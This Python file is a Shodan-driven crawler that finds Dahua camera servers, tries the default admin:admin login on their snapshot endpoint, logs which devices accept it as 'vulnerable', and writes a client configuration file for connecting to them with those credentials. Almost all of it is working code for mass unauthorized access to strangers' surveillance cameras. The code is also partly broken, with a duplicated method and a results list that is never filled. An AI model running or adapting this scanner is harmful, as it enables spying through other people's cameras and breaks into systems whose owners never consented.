import os
import argparse
import requests
import shodan
import concurrent.futures
import sqlite3
import logging
import queue
import threading
from itertools import islice

class DahuaWebCrawler:
    def __init__(self, db_file):
        self.SHODAN_API_KEY = os.getenv('SHODAN_API_KEY')
        self.api = shodan.Shodan(self.SHODAN_API_KEY)

        self.conn = sqlite3.connect(db_file)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS IPs (
                ip TEXT PRIMARY KEY,
                status TEXT
            )
        ''')
        self.vulnlist = []   # Initialize vulnlist here
        # Create queue for database writes
        self.db_queue = queue.Queue()

        # Start db write thread
        self.db_thread = threading.Thread(target=self.db_write_thread)
        self.db_thread.start()
        logging.basicConfig(filename='webcrawler.log', level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def get_addresses(self, amount, query):
        return [str(banner['ip_str']) for banner in islice(self.api.search_cursor(query), amount)]
    
    def build_link(self, ip):
        return 'http://admin:admin@' + ip + '/cgi-bin/snapshot.cgi'

    def is_request_successful(self, link):
        try:
            response = requests.get(link, verify=False, timeout=3)
            return response.status_code == 200
        except requests.exceptions.RequestException:
            return False

    def save_vulnerable_ips(self, vulnlist, filename='./list.txt'):
        with open(filename, 'w') as file:
            file.writelines(f'{ip}\n' for ip in vulnlist)

    def gen_device(self, vulnlist, filename='./devices.txt'):
        with open(filename, 'w') as file:
            file.write('<?xml version="1.0" encoding="UTF-8"?>\n')
            file.write('<DeviceManager version="2.0">\n')
            for i, vuln in enumerate(vulnlist):
                file.write(f'<Device name="Webcrawler{i}" domain="{vuln}" port="37777" username="admin" password="admin" protocol="1" connect="0" />\n')
            file.write('</DeviceManager>\n')

    def percentage(self, vuln, total):
        return (vuln / total) * 100 if total != 0 else 0

    def create_db(self, db_name='results.db'):
        self.conn = sqlite3.connect(db_name)
        self.cursor = self.conn.cursor()
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS IPs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip TEXT UNIQUE NOT NULL,
                status TEXT NOT NULL DEFAULT 'unchecked'
            )
        ''')
        self.conn.commit()

    def db_write_thread(self):
        while True:
            ip, status = self.db_queue.get()
            if ip is None:
                # None is our signal to stop the thread
                break
            self.save_to_db(ip, status)

    def save_to_db(self, ip, status):
        try:
            self.cursor.execute('''
                INSERT INTO IPs (ip, status) VALUES (?, ?)
                ON CONFLICT(ip) DO UPDATE SET status=excluded.status
            ''', (ip, status))
            self.conn.commit()
        except sqlite3.Error as e:
            logging.error(f'Database error: {e}')

    def save_to_db(self, ip, status):
        try:
            self.cursor.execute('''
                INSERT INTO IPs (ip, status) VALUES (?, ?)
                ON CONFLICT(ip) DO UPDATE SET status=excluded.status
            ''', (ip, status))
            self.conn.commit()
        except sqlite3.Error as e:
            logging.error(f'Database error: {e}')


    def close_db(self):
        self.conn.close()

    def run(self, amount, query):
        try:
            self.iplist = self.get_addresses(amount, query)

            # Store all IPs in the database as unchecked
            for ip in self.iplist:
                self.save_to_db(ip, 'unchecked')

            with concurrent.futures.ThreadPoolExecutor() as executor:
                futures = {executor.submit(self.is_request_successful, self.build_link(ip)): ip for ip in self.iplist}
                for future in concurrent.futures.as_completed(futures):
                    ip = futures[future]
                    try:
                        if future.result():
                            logging.info(f'Success on IP: {ip}')
                            self.db_queue.put((ip, 'vulnerable'))
                        else:
                            logging.info(f'Fail on IP: {ip}')
                            self.db_queue.put((ip, 'not_vulnerable'))
                    except Exception as exc:
                        logging.error(f'An error occurred with IP {ip}: {exc}')

        except KeyboardInterrupt:
            logging.warning('Interrupted by user')
        finally:
            # Signal db write thread to stop and wait for it to finish
            self.db_queue.put((None, None))
            self.db_thread.join()

            self.conn.close()
            logging.info('Database connection closed')

        return self.vulnlist
    

if __name__ == "__main__":
    crawler = DahuaWebCrawler('crawler.db')  # The argument is the name of the SQLite database file.
    crawler.run(10, "Dahua \"server: Dahua Rtsp Server\"")  # Parameters: amount of hosts to audit, and the search query